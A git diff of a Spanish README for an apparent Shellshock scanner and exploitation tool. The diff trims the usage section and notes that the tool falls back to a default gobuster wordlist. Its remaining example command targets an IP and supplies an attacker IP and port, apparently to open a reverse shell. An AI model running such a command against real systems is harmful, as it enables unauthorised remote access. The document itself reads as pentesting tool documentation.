@@ -36,22 +36,11 @@ El script verificará e instalará automáticamente las dependencias necesarias.
 
 ## Uso
 
-### Modo interactivo (recomendado)
-
-Simplemente ejecuta el script sin argumentos con la opción -h y sigue los pasos interactivos:
-
-```bash
-./shellshock_scanner.py
-```
-
 ```bash
 ./shellshock_scanner.py -h
 ```
 
-
-### Modo con argumentos
-
-También puedes ejecutar el script con argumentos específicos:
+Puedes especificar un diccionario para gobuster, en caso de no hacerlo usará uno por defecto y si no lo encuentra usará una lista de palabras predefinida.
 
 ```bash
 ./shellshock_scanner.py --target 192.168.1.10 --attacker-ip 192.168.1.5 --attacker-port 4444 --wordlist /usr/share/wordlists/dirb/common.txt
